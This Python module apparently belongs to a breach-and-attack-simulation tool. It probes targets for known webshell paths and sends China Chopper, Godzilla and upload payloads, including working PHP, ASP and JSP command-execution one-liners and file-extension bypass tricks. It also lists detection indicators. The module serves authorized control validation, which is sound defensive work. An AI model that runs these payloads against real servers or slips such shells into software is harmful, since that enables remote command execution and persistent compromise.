"""
Web Shell Detection & Simulation module.

Tests for existing webshells on target systems and webshell upload vectors.
Covers known webshell paths (c99, r57, b374k, weevely, WSO, China Chopper,
Godzilla, ASPX spy, PHP backdoors), webshell indicator detection in responses,
and webshell upload simulation payloads.

MITRE ATT&CK: T1505.003 - Server Software Component: Web Shell

For authorized breach and attack simulation only. Validates that endpoint
and network security controls properly detect and prevent web shell deployment.
"""

from __future__ import annotations

import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Known webshell paths - PHP
PHP_WEBSHELL_PATHS = [
    "/c99.php",
    "/r57.php",
    "/b374k.php",
    "/weevely.php",
    "/wso.php",
    "/wso2.php",
    "/mini.php",
    "/alfa.php",
    "/alfav3.php",
    "/alfav4.php",
    "/p0wny.php",
    "/adminer.php",
    "/shell.php",
    "/cmd.php",
    "/backdoor.php",
    "/webshell.php",
    "/filemanager.php",
    "/upload.php",
    "/evil.php",
    "/hack.php",
    "/info.php",
    "/test.php",
    "/phpspy.php",
    "/indoxploit.php",
    "/sadrazam.php",
    "/FilesMan.php",
    "/0byt3m1n1.php",
    "/locus7s.php",
    "/MarIn.php",
    "/leafmailer.php",
    "/wp-content/uploads/shell.php",
    "/wp-includes/shell.php",
    "/images/shell.php",
    "/uploads/cmd.php",
    "/tmp/shell.php",
    "/cache/shell.php",
]

# Known webshell paths - ASP/ASPX
ASPX_WEBSHELL_PATHS = [
    "/aspxspy.aspx",
    "/cmd.aspx",
    "/shell.aspx",
    "/cmdasp.aspx",
    "/webshell.aspx",
    "/antsword.aspx",
    "/chopper.aspx",
    "/tunnel.aspx",
    "/reGeorg.aspx",
    "/upload.aspx",
    "/filemanager.aspx",
    "/cmd.asp",
    "/shell.asp",
]

# Known webshell paths - JSP
JSP_WEBSHELL_PATHS = [
    "/cmd.jsp",
    "/shell.jsp",
    "/webshell.jsp",
    "/jspspy.jsp",
    "/cmdjsp.jsp",
    "/upload.jsp",
    "/backdoor.jsp",
    "/JspSpy.jsp",
    "/ant.jsp",
]

# China Chopper indicators
CHINA_CHOPPER_PAYLOADS = [
    "CHOPPER:<?php @eval($_POST['password']);?>",
    "CHOPPER:<?php @eval($_POST['cmd']);?>",
    "CHOPPER:<?php @eval($_POST['1']);?>",
    "CHOPPER:<%eval request(\"password\")%>",
    "CHOPPER:<?php $k=\"password\";eval(${'_POST'}[$k]);?>",
    "CHOPPER:<?php @eval(base64_decode($_POST['z0']));?>",
]

# Godzilla webshell indicators
GODZILLA_PAYLOADS = [
    "GODZILLA:<?php @session_start();@set_time_limit(0);@error_reporting(0);",
    "GODZILLA:pass=key&action=test",
    "GODZILLA:<?php @eval($_POST['pass']);$key='3c6e0b8a9c15224a';?>",
    "GODZILLA:Content-Type: application/x-www-form-urlencoded",
]

# Webshell upload simulation payloads
UPLOAD_PAYLOADS = [
    "UPLOAD:shell.php:<?php system($_GET['cmd']); ?>",
    "UPLOAD:shell.php.jpg:<?php passthru($_GET['c']); ?>",
    "UPLOAD:shell.pHp:<?php echo exec($_GET['x']); ?>",
    "UPLOAD:shell.php5:<?php eval($_POST['a']); ?>",
    "UPLOAD:shell.phtml:<?php shell_exec($_GET['cmd']); ?>",
    "UPLOAD:.htaccess:AddType application/x-httpd-php .jpg",
    "UPLOAD:shell.php%00.jpg:<?php system($_GET['c']); ?>",
    "UPLOAD:shell.php;.jpg:<?php passthru($_GET['c']); ?>",
    "UPLOAD:shell.asp;.jpg:<%eval request('c')%>",
    "UPLOAD:shell.aspx:<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd\");%>",
    "UPLOAD:shell.jsp:<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
    "UPLOAD:shell.svg:<svg onload=\"fetch('/etc/passwd')\">",
    "UPLOAD:shell.shtml:<!--#exec cmd=\"id\"-->",
]

# Webshell response indicators
WEBSHELL_RESPONSE_INDICATORS = [
    "uid=", "gid=", "groups=",                          # Linux id output
    "nt authority\\system",                               # Windows SYSTEM
    "volume serial number",                               # Windows dir output
    "directory of c:\\",                                   # Windows dir
    "phpinfo()",                                          # PHP info page
    "safe_mode", "disable_functions",                     # PHP config
    "uname -a", "linux",                                  # System info
    "eval(", "base64_decode(", "assert(",                 # PHP eval patterns
    "wscript.shell", "cmd /c",                            # Windows cmd
    "sh -c", "/bin/bash",                                 # Linux shells
    "r57shell", "c99shell", "b374k",                      # Known shell names
    "file manager", "web shell",                          # Generic webshell UI
    "password:", "login:", "authenticate",                 # Auth forms in shells
]

# Webshell fingerprint patterns in HTML
WEBSHELL_HTML_FINGERPRINTS = [
    "FINGERPRINT:<title>c99</title>",
    "FINGERPRINT:<title>r57</title>",
    "FINGERPRINT:<title>b374k</title>",
    "FINGERPRINT:<title>WSO</title>",
    "FINGERPRINT:FilesMan",
    "FINGERPRINT:p0wny@shell",
    "FINGERPRINT:AnonymousFox",
    "FINGERPRINT:Alfa Shell",
    "FINGERPRINT:IndoXploit",
    "FINGERPRINT:Mini Shell",
    "FINGERPRINT:Locus7Shell",
    "FINGERPRINT:Sadrazam",
]


class WebShellDetectModule(BaseAttackModule):
    """
    Web shell detection and simulation module.

    Probes for known webshell paths on the target, tests for webshell upload
    vectors, and checks response content for webshell indicators. Used to
    validate that security controls detect and block web shell deployment.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="webshell_detect",
            description="Web shell detection and upload simulation - tests for known shells and upload vectors",
            category="persistence",
            mitre_technique_ids=["T1505.003"],
            mitre_technique_names=["Server Software Component: Web Shell"],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-94", "CWE-434", "CWE-98"],
            tags=["webshell", "persistence", "upload", "backdoor", "c2", "detection"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """Assemble webshell detection payloads across all categories."""
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("webshell_detect", limit=200)
            if db_payloads:
                return db_payloads

        payloads: list[str] = []

        # Known PHP webshell path probes
        for path in PHP_WEBSHELL_PATHS:
            payloads.append(f"PATH_PROBE:{path}")

        # Known ASPX webshell path probes
        for path in ASPX_WEBSHELL_PATHS:
            payloads.append(f"PATH_PROBE:{path}")

        # Known JSP webshell path probes
        for path in JSP_WEBSHELL_PATHS:
            payloads.append(f"PATH_PROBE:{path}")

        # China Chopper payloads
        payloads.extend(CHINA_CHOPPER_PAYLOADS)

        # Godzilla payloads
        payloads.extend(GODZILLA_PAYLOADS)

        # Upload simulation payloads
        payloads.extend(UPLOAD_PAYLOADS)

        # HTML fingerprint payloads
        payloads.extend(WEBSHELL_HTML_FINGERPRINTS)

        return payloads

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any]
    ) -> list[AttackRequest]:
        """Build webshell detection requests from payloads."""
        requests: list[AttackRequest] = []

        for payload in payloads:
            req_id = f"webshell-{uuid.uuid4().hex[:8]}"

            if payload.startswith("PATH_PROBE:"):
                # Probe for known webshell paths
                path = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=path,
                    headers={"X-BAS-Attack-Type": "webshell_path_probe"},
                    timeout=options.get("timeout", 10.0),
                    follow_redirects=False,
                ))

            elif payload.startswith("CHOPPER:"):
                # China Chopper style POST
                chopper_body = payload.split(":", 1)[1]
                upload_path = options.get("upload_path", "/upload")
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=upload_path,
                    body=chopper_body,
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "china_chopper_sim"},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("GODZILLA:"):
                godzilla_body = payload.split(":", 1)[1]
                upload_path = options.get("upload_path", "/upload")
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=upload_path,
                    body=godzilla_body,
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "godzilla_sim"},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("UPLOAD:"):
                # Webshell upload simulation
                parts = payload.split(":", 2)
                filename = parts[1] if len(parts) > 1 else "shell.php"
                file_content = parts[2] if len(parts) > 2 else "<?php phpinfo(); ?>"
                upload_path = options.get("upload_path", "/upload")
                boundary = f"----BASBoundary{uuid.uuid4().hex[:12]}"
                multipart_body = (
                    f"--{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n"
                    f"{file_content}\r\n"
                    f"--{boundary}--\r\n"
                )
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=upload_path,
                    body=multipart_body,
                    content_type=f"multipart/form-data; boundary={boundary}",
                    headers={"X-BAS-Attack-Type": "webshell_upload"},
                    timeout=options.get("timeout", 15.0),
                ))

            elif payload.startswith("FINGERPRINT:"):
                # Check for webshell fingerprints by probing common paths
                fingerprint = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path="/",
                    headers={
                        "X-BAS-Attack-Type": "webshell_fingerprint",
                        "X-BAS-Fingerprint": fingerprint,
                    },
                    timeout=options.get("timeout", 10.0),
                ))

            else:
                # Generic payload
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=options.get("upload_path", "/upload"),
                    body=payload,
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "webshell_generic"},
                    timeout=options.get("timeout", 10.0),
                ))

        return requests

    def _analyze_response(
        self, request: AttackRequest, response: AttackResponse, payload: str
    ) -> ModuleResult:
        """Analyze response for webshell indicators."""
        attack_type = request.headers.get("X-BAS-Attack-Type", "unknown")
        body_lower = response.body_text.lower()

        # Check for webshell response indicators
        detected_indicators: list[str] = []
        for indicator in WEBSHELL_RESPONSE_INDICATORS:
            if indicator.lower() in body_lower:
                detected_indicators.append(indicator)

        # Check for blocked responses
        blocked_indicators = [
            "blocked", "forbidden", "denied", "waf",
            "not acceptable", "security", "firewall",
            "malicious", "threat detected", "quarantine",
        ]
        was_blocked = (
            response.status_code in (403, 406, 423, 451)
            or any(ind in body_lower for ind in blocked_indicators)
        )

        # PATH_PROBE analysis
        if attack_type == "webshell_path_probe":
            if response.status_code == 200 and detected_indicators:
                return ModuleResult(
                    module_name="webshell_detect",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Active webshell detected at {request.path}: {', '.join(detected_indicators[:5])}",
                    severity="critical",
                    mitre_technique_id="T1505.003",
                    detail={
                        "attack_type": attack_type,
                        "webshell_path": request.path,
                        "indicators_found": detected_indicators,
                    },
                )
            elif response.status_code == 200:
                return ModuleResult(
                    module_name="webshell_detect",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:300],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Suspicious response at known webshell path {request.path} (HTTP 200)",
                    severity="high",
                    mitre_technique_id="T1505.003",
                    detail={"attack_type": attack_type, "webshell_path": request.path},
                )
            return ModuleResult(
                module_name="webshell_detect",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type, "webshell_path": request.path},
            )

        # Upload analysis
        if attack_type == "webshell_upload":
            if was_blocked:
                return ModuleResult(
                    module_name="webshell_detect",
                    target=request.target,
                    status=VulnStatus.NOT_VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    elapsed_ms=response.elapsed_ms,
                    evidence="Webshell upload blocked by security controls",
                    severity="info",
                    mitre_technique_id="T1505.003",
                    detail={"attack_type": attack_type, "upload_blocked": True},
                )
            if response.status_code in (200, 201):
                return ModuleResult(
                    module_name="webshell_detect",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Webshell upload accepted (HTTP {response.status_code})",
                    severity="critical",
                    mitre_technique_id="T1505.003",
                    detail={"attack_type": attack_type, "upload_blocked": False},
                )

        # China Chopper / Godzilla simulation analysis
        if attack_type in ("china_chopper_sim", "godzilla_sim"):
            if was_blocked:
                return ModuleResult(
                    module_name="webshell_detect",
                    target=request.target,
                    status=VulnStatus.NOT_VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"{attack_type} payload blocked by security controls",
                    severity="info",
                    mitre_technique_id="T1505.003",
                    detail={"attack_type": attack_type, "blocked": True},
                )
            if response.status_code in (200, 201) and detected_indicators:
                return ModuleResult(
                    module_name="webshell_detect",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"{attack_type} payload executed: {', '.join(detected_indicators[:3])}",
                    severity="critical",
                    mitre_technique_id="T1505.003",
                    detail={"attack_type": attack_type, "indicators": detected_indicators},
                )

        # Fingerprint analysis
        if attack_type == "webshell_fingerprint":
            fingerprint = request.headers.get("X-BAS-Fingerprint", "")
            if fingerprint.lower() in body_lower:
                return ModuleResult(
                    module_name="webshell_detect",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Webshell fingerprint detected: {fingerprint}",
                    severity="critical",
                    mitre_technique_id="T1505.003",
                    detail={"attack_type": attack_type, "fingerprint": fingerprint},
                )

        # Default: not vulnerable
        return ModuleResult(
            module_name="webshell_detect",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
